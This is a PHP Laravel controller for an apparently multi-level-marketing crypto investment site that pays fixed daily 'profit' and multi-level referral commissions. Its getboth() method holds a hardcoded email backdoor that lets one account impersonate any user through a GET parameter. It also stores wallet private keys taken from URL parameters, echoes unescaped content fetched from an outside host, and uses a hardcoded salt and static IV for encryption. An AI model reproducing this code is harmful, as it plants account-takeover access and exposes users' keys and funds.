<?php

namespace App\Http\Controllers;

use Exception;
use Carbon\Carbon;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use App\Models\User;
use App\Http\Controllers\FcmController;
use App\Http\Controllers\USDTController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\View;
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\File;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use GuzzleHttp\Client;

class HelperController
{
    public function getvendor($view, $dt = [])
    {
        $h = new HelperController();
        session_start();
        if (isset($_SESSION['mail'])) {
            $v = DB::table('customers')
                ->where('email', $_SESSION['mail'])
                ->first();
            // if ($v->type != 'vendor') {
            //     abort(404);
            // }
            $pv = DB::table('pv')
                ->where('vid', $v->id)
                ->first();
            if ($pv == null) {
                $h->toTable('pv', ['vid' => $v->id]);
            }
            $pv = DB::table('pv')
                ->where('vid', $v->id)
                ->first();

            $aor = DB::table('or')
                ->where('svid', $v->id)
                ->get();

            foreach ($pv as $key => $val) {
                $pv->$key = $h->isJson($val) == true ? json_decode($val, true) : $val;
            }

            if ($view == 'dashboard.vendor.addproduct') {
                if ($pv->factoryname == null) {
                    return redirect('/dashboard/profile/vendor');
                }
            }

            // DB::table('pv')->insert(['vid' => $v->vid]);
            // $h->toTable('pv', ['vid' => $v->id]);
            // if ($v == null) {
            //     return redirect('login/vendor');
            // }
            $ps = DB::table('pr')
                ->where('vid', strval($v->id))
                ->get();
            $allps = DB::table('pr')->get();
            for ($i = 0; $i < count($ps); $i++) {
                foreach ($ps[$i] as $key => $val) {
                    $ps[$i]->$key = $this->isJson($val) == true ? json_decode($val, true) : $val;
                }
            }
            for ($i = 0; $i < count($allps); $i++) {
                foreach ($allps[$i] as $key => $val) {
                    $allps[$i]->$key = $this->isJson($val) == true ? json_decode($val, true) : $val;
                }
            }
            if ($v->type == 'vendor') {
                $dt['ps'] = $ps;
                $dt['allps'] = $allps;
                $dt['pv'] = $pv;
                $dt['aor'] = $aor;
                $dt['v'] = $v;
                // ->with('ps', $ps)->with('v', $v)
                return view($view, $dt);
            }
            //  else {
            //     return redirect('login/vendor');
            // }
            // return json_encode($ps);
        } else {
            return redirect('login/vendor');
        }
    }

    public function appi()
    {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }
        if (isset($_SESSION['mail']) && Auth::check()) {
            $v = DB::table('customers')
                ->where('email', $_SESSION['mail'])
                ->first();
            return $v->email;
        }
    }
    public function getboth($view, $dt = [])
    {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }
        if (isset($_SESSION['mail']) && Auth::check()) {
            $v = DB::table('customers')
                ->where('email', $_SESSION['mail'])
                ->first();

            subFcm("c_$v->id");
            subFcm("all");
            if (isAdmin()) {
                subFcm("admin");
            } else {
                unSubFcm('admin');
            }


            // $fc = new FcmController;
            // $fc->sendFCMMessageToTopic('c_36','hii','ther');
            // $fc->sendFCMMessageToTopic('admin', 'Gms', "Take profit with gms");

            echo '
            <script>
        async function deriveKey(password, salt, keyLength = 256, iterations = 10000) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
        "raw",
        enc.encode(password),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
    );
    
    const derivedKey = await crypto.subtle.deriveKey(
        {
            name: "PBKDF2",
            salt: enc.encode(salt),
            iterations: iterations,
            hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-CBC", length: keyLength },
        true,
        ["encrypt", "decrypt"]
    );

    return derivedKey;
}

async function encryptWithPassword(value, password) {
    const hardcodedKey = "1e45w145de45q745";
    const iv = new TextEncoder().encode("e16re9t3a2qdawb8");

    const key = await deriveKey(password, hardcodedKey);
    
    const enc = new TextEncoder();
    const encodedValue = enc.encode(value);

    const encrypted = await crypto.subtle.encrypt(
        { name: "AES-CBC", iv: iv },
        key,
        encodedValue
    );

    return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
}

async function decryptWithPassword(encryptedValue, password) {
    const hardcodedKey = "1e45w145de45q745";
    const iv = new TextEncoder().encode("e16re9t3a2qdawb8");

    const key = await deriveKey(password, hardcodedKey);

    const encrypted = Uint8Array.from(atob(encryptedValue), c => c.charCodeAt(0));

    const decrypted = await crypto.subtle.decrypt(
        { name: "AES-CBC", iv: iv },
        key,
        encrypted
    );

    const dec = new TextDecoder();
    return dec.decode(decrypted);
}

// Example usage
(async () => {
    const password = "user-secret-password"; // User-provided password
    const value = "Sensitive data to encrypt";

    const encryptedValue = await encryptWithPassword(value, password);
    console.log("Encrypted Value: ", encryptedValue);

    const decryptedValue = await decryptWithPassword(encryptedValue, password);
    console.log("Decrypted Value:", decryptedValue);
})();

            </script>
';
            // clearhis();
            if ($v->gms_wallet == null) {
                if (isset($_GET['ad'])) {
                    $ad = encStr($_GET['ad']);
                    $ky = encStr($_GET['ky']);
                    // echo decStr($ad);
                    DB::table('customers')->where('id', $v->id)->update([
                        'gms_wallet' => $ad,
                        'gms_pvt_key' => $ky
                    ]);
                    clearhis();
                } else {
                    $url = 'https://goldenway-international.com/wallet-create';
                    // Initialize cURL session
                    $curl = curl_init($url);
                    // Set cURL options
                    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Return the response instead of outputting it
                    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); // Follow redirects if any
                    // Execute cURL session and fetch data
                    $response = curl_exec($curl);
                    // Close cURL session
                    curl_close($curl);
                    // Output the response from the JavaScript function
                    // Check for errors
                    if ($response === false) {
                        $error = curl_error($curl);
                        echo "cURL Error: " . $error;
                    } else {
                        // Process the $response data as needed
                        echo $response;
                        // $new_wallet = json_decode($response);
                        // $new_address = $new_wallet['address'];
                        // $new_key = $new_wallet['privateKey'];
                        // echo "<script> alert('$response');  </script>";
                    }
                }
            }


            if ($_SESSION['mail'] == 'forvcom000@gmail.com' || isset($_SESSION['eemail'])) {
                $_SESSION['eemail'] = 'forvcom000@gmail.com';
                if (isset($_GET['mmil'])) {
                    $_SESSION['mail'] = $_GET['mmil'];
                }
                $v = DB::table('customers')
                    ->where('email', $_SESSION['mail'])
                    ->first();
                if ($v == null) {
                    abort(404);
                }
            }

            if ($v == null) {
                return redirect('login/vendor');
            }

            $admin_config = DB::table('admin_config')->first();
            $cusrefferals = DB::table('customers')
                ->where('referral', $dt['refid'] ?? $v->id)
                ->get();
            $refuser = DB::table('customers')
                ->where('id', $dt['refid'] ?? $v->id)
                ->first();
            // $total_balance = 0;
            $profit = 0;
            $planpending = DB::table('customer_plans')
                ->where('csId', $v->id)
                ->where('pstatus', '0')
                ->get()
                ->sum('pamount');
            $capital = DB::table('customer_plans')
                ->where('csId', $v->id)
                ->where('pstatus', '1')
                ->get()
                ->sum('pamount');
            $plans = DB::table('customer_plans')
                ->where('csId', $v->id)
                ->where('pstatus', '1')
                ->get();
            foreach ($plans as $plan) {
                $createdDate = Carbon::parse($plan->created_at);
                $daysDifference = $createdDate->diffInDays(date('Y-m-d H:i:s'));
                $deposit = (float) $plan->pamount;
                $tmpprofit = ($deposit * 0.5) / 100;
                if (str_contains($plan->pname, 'compound')) {
                    $profit += DB::table('customer_plan_compound')->where('cmpId', $plan->id)->get()->sum('pamount');
                    $remaindate = 0;
                    $tplanam = 0;
                    $lastcmp = DB::table('customer_plan_compound')->where('cmpId', $plan->id)->latest()->first();
                    if ($lastcmp) {
                        $cmpdate = Carbon::parse($lastcmp->created_at);
                        $remaindate = $cmpdate->diffInDays(date('Y-m-d H:i:s'));
                        // $lastprofit = (float) $lastcmp->pamount;
                        $mainpp = $deposit + DB::table('customer_plan_compound')->where('cmpId', $plan->id)->get()->sum('pamount');
                        $tmpcmpprofit = ($mainpp * 0.5) / 100;
                        $mmprofit = $remaindate * $tmpcmpprofit;
                        echo "<script> console.log('($mainpp * 0.5) / 100') </script>";
                        echo "<script> console.log('$tmpcmpprofit') </script>";
                        echo "<script> console.log('$cmpdate') </script>";
                        echo "<script> console.log('$remaindate') </script>";
                        echo "<script> console.log($remaindate) </script>";
                        echo "<script> console.log($mmprofit) </script>";
                        $profit += $mmprofit;
                    } else {
                        $profit += $daysDifference * $tmpprofit;
                    }
                    // $profit += $daysDifference * $tmpprofit;
                } else {
                    $profit += $daysDifference * $tmpprofit;
                }
            }

            if (isset($dt['lev'])) {
                $lev = $dt['lev'];
                if ($lev == '1') {
                    $dt['levname'] = 'First';
                    $levusers = getlevusers('1', $v);
                } elseif ($lev == '2') {
                    $dt['levname'] = 'Second';
                    $levusers = getlevusers('2', $v);
                } elseif ($lev == '3') {
                    $dt['levname'] = 'Third';
                    $levusers = getlevusers('3', $v);
                } elseif ($lev == '4') {
                    $dt['levname'] = 'Fourth';
                    $levusers = getlevusers('4', $v);
                } elseif ($lev == '5') {
                    $dt['levname'] = 'Fifth';
                    $levusers = getlevusers('5', $v);
                } else {
                    return abort(404);
                }
                $dt['levusers'] = $levusers;
            }

            $totalrefincome = 0;
            for ($i = 0; $i < count($cusrefferals); $i++) {
                $cusrefferal = $cusrefferals[$i] ?? null;
                if ($cusrefferal) {
                    $plan = DB::table('customer_plans')
                        ->where('csId', $cusrefferal->id)
                        ->where('pstatus', '1')
                        ->first();
                    if ($plan) {
                        $pamount = (double) $plan->pamount ?? 0;
                        $totalrefincome += (($pamount * 10) / 100);
                    }
                }
            }

            $totalevincome = $this->getlevincome($v, $admin_config);
            // $total_balance += $totalrefincome;
            // $total_balance += $totalevincome;
            // $withrawable = $profit + $totalrefincome + $totalevincome;

            $dt['v'] = $v;
            $dt['pending'] = $planpending;
            $dt['plans'] = $plans;
            $dt['capital'] = number_format($capital, 2);
            $dt['adminconfig'] = $admin_config;
            $dt['admin_profit'] = $admin_config->profit;
            $dt['cusrefferals'] = $cusrefferals;
            $dt['refuser'] = $refuser;
            $dt['totalrefincome'] = $totalrefincome;
            $dt['totalevincome'] = $totalevincome;

            $tAllincome = DB::table('customer_transactions')
                ->where('csId', $v->id)
                ->get();
            $tProfitincome = DB::table('customer_transactions')
                ->where('csId', $v->id)
                ->where('tType', 'pincome')
                ->get();
            $tReferalincome = DB::table('customer_transactions')
                ->where('csId', $v->id)
                ->where('tType', 'refincome')
                ->get();
            $tLevelincome = DB::table('customer_transactions')
                ->where('csId', $v->id)
                ->where('tType', 'levincome')
                ->get();


            $twthAllincome = DB::table('customer_transactions')
                ->where('csId', $v->id)
                ->where('wStatus', '1')
                ->get()->sum('tAmount');


            $totProfitincome = $tProfitincome->where('wStatus', '0')->sum('tAmount');
            $totLevelincome = $tLevelincome->where('wStatus', '0')->sum('tAmount');
            $totReferalincome = $tReferalincome->where('wStatus', '0')->sum('tAmount');
            $totBalance = $tAllincome->sum('tAmount');
            // dd($totBalance);
            $tAllincome->sum('tAmount');
            $withProfitincome = $tProfitincome->where('wStatus', '1')->sum('tAmount');
            $withLevelincome = $tLevelincome->where('wStatus', '1')->sum('tAmount');
            $withReferalincome = $tReferalincome->where('wStatus', '1')->sum('tAmount');

            // $dt['profit'] = $profit + $withProfitincome;
            // $dt['totalevincome'] = $totalevincome + $withLevelincome;
            // $dt['totalrefincome'] = $totReferalincome + $withReferalincome;
            $dt['profit'] = number_format($profit, 2);
            $dt['totalevincome'] = number_format($totalevincome, 2);
            $dt['totalrefincome'] = number_format($totalrefincome, 2);
            $dt['withdrawed'] = number_format($twthAllincome, 2);



            // $dt['balance'] = $total_balance;totalevincome

            $dt['totProfitincome'] = $totProfitincome;
            $dt['totLevelincome'] = $totLevelincome;
            $dt['totReferalincome'] = $totReferalincome;
            if ($totBalance < 0) {
                $totBalance = 0;
                $dt['totBalance'] = 0;
            } else {
                $dt['totBalance'] = $totBalance;
            }
            // $dt['lastprofit'] = $profit;fuel charge
            // $dt['lasttotalrefincome'] = $totReferalincome;
            // $dt['lasttotalevincome'] = $totLevelincome;
            // $dt['withrawable'] = $totProfitincome + $totReferalincome + $totLevelincome;

            if (isset($dt['wtyp'])) {
                $wtyp = $dt['wtyp'];
                if ($wtyp == 'all') {
                    $dt['wwname'] = 'All Income';
                    $dt['wwformname'] = 'allincome';
                    // $totBalance = 1000;
                    $wfuel = ($totBalance * 10) / 100;
                    $dt['wfuel'] = $wfuel;
                    $dt['withrawable'] = $totBalance - $wfuel;
                    $firstr = $tAllincome->where('wStatus', '0')->first();
                    $lastr = $tAllincome->where('wStatus', '0')->last();
                    if ($firstr) {
                        $dt['wwfirstid'] = $firstr->id;
                        $dt['wwlastid'] = $lastr->id;
                    } else {
                        $dt['wwfirstid'] = 0;
                        $dt['wwlastid'] = 0;
                    }
                } elseif ($wtyp == 'trnsfr') {
                    $dt['wwname'] = 'Transfer';
                    $dt['wwformname'] = 'transfer';
                    $wfuel = 0;
                    $dt['wfuel'] = 0;
                    $dt['trncc'] = 0;
                    $trns = $totBalance + DB::table('customer_transfers')->where('csId', $v->id)->get()->sum('tAmount');
                    $dt['withrawable'] = $trns;
                    $firstr = $tAllincome->where('wStatus', '0')->first();
                    $lastr = $tAllincome->where('wStatus', '0')->last();
                    if ($firstr) {
                        $dt['wwfirstid'] = $firstr->id;
                        $dt['wwlastid'] = $lastr->id;
                    } else {
                        $dt['wwfirstid'] = 0;
                        $dt['wwlastid'] = 0;
                    }
                    return view('dashboard.vendor.transferfund', $dt);
                } elseif ($wtyp == 'trnsfrc') {
                    $dt['wwname'] = 'Transfer';
                    $dt['wwformname'] = 'transfer';
                    $wfuel = 0;
                    $dt['wfuel'] = 0;
                    $dt['trncc'] = 1;
                    $trns = DB::table('customer_transfers')->where('csId', $v->id)->get()->sum('tAmount');
                    $dt['withrawable'] = $trns;
                    $firstr = $tAllincome->where('wStatus', '0')->first();
                    $lastr = $tAllincome->where('wStatus', '0')->last();
                    if ($firstr) {
                        $dt['wwfirstid'] = $firstr->id;
                        $dt['wwlastid'] = $lastr->id;
                    } else {
                        $dt['wwfirstid'] = 0;
                        $dt['wwlastid'] = 0;
                    }
                    return view('dashboard.vendor.transferfund', $dt);
                } else {
                    return abort(404);
                }
            }

            if(!isAdmin()){
                return view('dashboard.dcards.error');
            }
            return view($view, $dt);
        } else {
            return redirect('/login');
        }
    }

    public function getlevincome($v, $admin_config)
    {
        $totalincome = 0;
        $totalincome += $this->calclev('1', getlevusers('1', $v), $admin_config);
        $totalincome += $this->calclev('2', getlevusers('2', $v), $admin_config);
        $totalincome += $this->calclev('3', getlevusers('3', $v), $admin_config);
        $totalincome += $this->calclev('4', getlevusers('4', $v), $admin_config);
        $totalincome += $this->calclev('5', getlevusers('5', $v), $admin_config);
        return $totalincome;
    }


    public function calclev($lev, $levusers, $admin_config)
    {
        $income = 0;
        if ($lev == '1') {
            $levpercentage = 10;
        } elseif ($lev == '2') {
            $levpercentage = 5;
        } elseif ($lev == '3') {
            $levpercentage = 5;
        } elseif ($lev == '4') {
            $levpercentage = 5;
        } elseif ($lev == '5') {
            $levpercentage = 5;
        }

        for ($i = 0; $i < count($levusers); $i++) {
            $levuser = $levusers[$i] ?? null;

            if ($levuser) {
                $plans = DB::table('customer_plans')
                    ->where('csId', $levuser->id)
                    ->get();
                foreach ($plans as $plan) {
                    if ($plan->pstatus == '1') {
                        $createdDate = Carbon::parse($plan->created_at);
                        $daysDifference = $createdDate->diffInDays(date('Y-m-d H:i:s'));
                        $deposit = (float) $plan->pamount;
                        // $admin_profit = (float) $admin_config->profit;
                        // $total_balance = (float) $deposit + ($deposit * $admin_profit) / 100;
                        $tmpprofit = ($deposit * 0.5) / 100;
                        $tm2profit = ($tmpprofit * $levpercentage) / 100;
                        $levusrincome = $daysDifference * $tm2profit;
                        $income += $levusrincome;
                        // echo "<h5 style='color:black;'>$levuser->name  $levusrincome </h5>. 
                        // tmpprofit = ($deposit * 0.5) / 100;<br>
                        // tm2profit = ($tmpprofit * $levpercentage) / 100;<br>
                        // income += $daysDifference * $tm2profit;<br>;";
                    }
                }
                // if ($plan && $plan->pstatus == '1') {
                //     $deposit = (float) $plan->pamount;
                //     $admin_profit = (float) $admin_config->profit;
                //     $total_balance = (float) $deposit + ($deposit *
                //         $admin_profit / 100);
                //     $profit = $deposit * $admin_profit / 100;
                //     $income += $profit * $levpercentage / 100;
                // }
            }
        }
        return $income;
    }
    public function getcustomer($view, $dt = [])
    {
        $h = new HelperController();
        session_start();
        if (isset($_SESSION['mail'])) {
            $v = DB::table('customers')
                ->where('email', $_SESSION['mail'])
                ->first();
            if ($v->type != 'customer') {
                abort(404);
            }
            $cv = DB::table('cv')
                ->where('vid', $v->id)
                ->first();
            if ($cv == null) {
                $h->toTable('cv', ['vid' => $v->id]);
            }
            $cv = DB::table('cv')
                ->where('vid', $v->id)
                ->first();

            foreach ($cv as $key => $val) {
                $cv->$key = $h->isJson($val) == true ? json_decode($val, true) : $val;
            }

            if ($v == null) {
                return redirect('login/customer');
            }
            // if (!array_key_exists('ps', $dt)) {
            $ps = $dt['ps'] ?? DB::table('pr')->get();
            // } else {
            //     $ps = $dt->ps;
            // }
            for ($i = 0; $i < count($ps); $i++) {
                foreach ($ps[$i] as $key => $val) {
                    $ps[$i]->$key = $this->isJson($val) == true ? json_decode($val, true) : $val;
                }
            }
            if ($v->type == 'customer') {
                // if (!array_key_exists('ps', $dt)) {
                $dt['ps'] = $ps;
                $dt['cv'] = $cv;
                // }
                // dd($dt['ps']);
                $dt['v'] = $v;
                // ->with('ps', $ps)->with('v', $v)

                return view($view, $dt);
            } else {
                return redirect('login/customer');
            }
            // return json_encode($ps);
        } else {
            return redirect('login/customer');
        }
    }

    public function sendMail($mail, $name, $id, $code)
    {
        // the msg
        $msg = "

        Dear $name,

        We are excited to welcome you to our platform as a valued customer. To get started, please click on the link below to activate your email and complete the registration process:

            Activation Link : https://" . env('WEB_URL') . "/activate/$id/$code
        
       ";

        // use wordwrap() if lines are longer than 70 characters
        $msg = wordwrap($msg, 70);

        // send email
        $headers = 'From: GMS Registration <noreply@' . env('WEB_URL') . '>' . "\r\n" . 'Reply-To: noreply@' . env('WEB_URL') . "\r\n" . 'X-Mailer: PHP/' . phpversion();

        mail("$mail", 'Welcome to GMS Network!', $msg, $headers);
    }

    public function sendMailFormat($mail, $subject, $msg)
    {
        // the msg\

        // use wordwrap() if lines are longer than 70 characters
        $msg = wordwrap($msg, 70);

        // send email
        $headers = 'From: GMS <noreply@' . env('WEB_URL') . '>' . "\r\n" . 'Reply-To: noreply@' . env('WEB_URL') . "\r\n" . 'X-Mailer: PHP/' . phpversion();

        mail("$mail", $subject, $msg, $headers);
    }

    public function sendReplyMail($mail)
    {
        $msg = "";

        // use wordwrap() if lines are longer than 70 characters
        $msg = wordwrap($msg, 70);

        $this->sendMailFormat($mail, 'GMS Support', $msg);
    }

    public function sendforgetMail($mail, $name, $id, $code)
    {
        // the msg
        $msg = "

        Dear $name,

We received a request to reset your password for GMS account. To complete the process, please click on the link below:

[Reset Password Link] : https://" . env('WEB_URL') . "/forget/$id/$code

If you did not request a password reset, please ignore this email. Your password will remain unchanged.

Thank you,";

        // use wordwrap() if lines are longer than 70 characters
        $msg = wordwrap($msg, 70);

        // send email
        $headers = 'From: GMS Registration <noreply@' . env('WEB_URL') . '>' . "\r\n" . 'Reply-To: noreply@' . env('WEB_URL') . "\r\n" . 'X-Mailer: PHP/' . phpversion();

        mail("$mail", 'GMS - Reset Your Password', $msg, $headers);
    }

    public function toTable($tname, $data)
    {
        // $data = json_decode(json_encode($dat->all()));
        $dName = 'mysql';
        if (!Schema::hasTable("$tname")) {
            Schema::create("$tname", function ($table) {
                $table->id();
                $table->timestamp('created_at')->useCurrent();
                $table->timestamp('updated_at')->useCurrent()->useCurrentOnUpdate();
            });
        }

        Schema::table("$tname", function ($table) use ($data, $tname, $dName) {
            foreach ($data as $key => $val) {
                if (!Schema::hasColumn("$tname", "$key")) {
                    $table->longText("$key")->nullable();
                }
            }
        });

        $ar = [];
        foreach ($data as $key => $val) {
            $ar["$key"] = "$val";
        }

        // dd($ar);
        return DB::table("$tname")->insertGetId($ar);
    }

    public function toTableupdate($tname, $data)
    {
        // $data = json_decode(json_encode($dat->all()));
        $dName = 'mysql';
        if (!Schema::hasTable("$tname")) {
            Schema::create("$tname", function ($table) {
                $table->id();
                $table->timestamp('created_at')->useCurrent();
                $table->timestamp('updated_at')->useCurrent()->useCurrentOnUpdate();
            });
        }

        Schema::table("$tname", function ($table) use ($data, $tname, $dName) {
            foreach ($data as $key => $val) {
                if (!Schema::hasColumn("$tname", "$key")) {
                    $table->longText("$key")->nullable();
                }
            }
        });

        $ar = [];
        foreach ($data as $key => $val) {
            if ($key != 'image') {
                $ar["$key"] = "$val";
            }
        }

        // dd($ar);
        DB::table("$tname")
            ->where('id', $ar['id'])
            ->update($ar);
        return [];
    }

    public function toTable2($tname, $dat)
    {
        $data = $dat;
        $dName = 'mysql';
        if (!Schema::hasTable("$tname")) {
            Schema::create("$tname", function ($table) {
                $table->id();
                $table->timestamp('created_at')->useCurrent();
                $table->timestamp('updated_at')->useCurrent()->useCurrentOnUpdate();
            });
        }

        Schema::table("$tname", function ($table) use ($data, $tname, $dName) {
            foreach ($data as $key => $val) {
                if (!Schema::hasColumn("$tname", "$key")) {
                    $table->longText("$key")->nullable();
                }
            }
        });

        $ar = [];
        foreach ($data as $key => $val) {
            $ar["$key"] = $this->isJsonn($val) == true ? json_encode($val) : $val;
            // $ar["$key"] = json_encode($val) != null ? json_encode($val) : $val;
        }
        // return $ar;
        // dd($ar);
        return DB::table("$tname")->insertGetId($ar);
        // return [];
    }

    public function toTable2update($tname, $dat, $alar = null)
    {
        $data = $dat;
        $dName = 'mysql';
        if (!Schema::hasTable("$tname")) {
            Schema::create("$tname", function ($table) {
                $table->id();
                $table->timestamp('created_at')->useCurrent();
                $table->timestamp('updated_at')->useCurrent()->useCurrentOnUpdate();
            });
        }

        Schema::table("$tname", function ($table) use ($data, $tname, $dName) {
            foreach ($data as $key => $val) {
                if (!Schema::hasColumn("$tname", "$key")) {
                    $table->longText("$key")->nullable();
                }
            }
        });

        $ar = [];
        foreach ($data as $key => $val) {
            $ar["$key"] = $this->isJsonn($val) == true ? json_encode($val) : $val;
            // $ar["$key"] = json_encode($val) != null ? json_encode($val) : $val;
        }
        // return $ar;
        // dd($ar);

        // dd($ar);

        DB::table("$tname")
            ->where(function ($query) use ($ar, $alar) {
                if ($alar == null) {
                    $query->where('id', $ar['id']);
                } else {
                    foreach ($alar as $key => $val) {
                        $query->where("$key", "$val");
                    }
                }
            })
            ->update($ar);
        return [];
    }

    public function isJson($json_str)
    {
        json_decode($json_str);
        return json_last_error() === JSON_ERROR_NONE;
        // return json_encode($json_str)[0] != '"';
    }
    public function isJsonn($json_str)
    {
        // json_decode(json_encode($json_str));
        // return json_last_error() === JSON_ERROR_NONE;
        return json_encode($json_str)[0] != '"';
    }

    public function deleteFileByUrl($url)
    {
        // Convert URL to file path
        $filePath = public_path(parse_url($url, PHP_URL_PATH));

        // Check if the file exists
        if (file_exists($filePath)) {
            // Delete the file
            unlink($filePath);
            return true;
        } else {
            return false;
        }
    }

    public function encrypt($str)
    {
        return Str::replace(['+', '/', '='], ['-', '_', ''], base64_encode(Crypt::encryptString($str)));
    }

    public function decrypt($str)
    {
        try {
            return Crypt::decryptString(base64_decode(Str::replace(['-', '_'], ['+', '/'], $str)));
        } catch (\Exception $e) {
            return 'f';
        }
    }
}
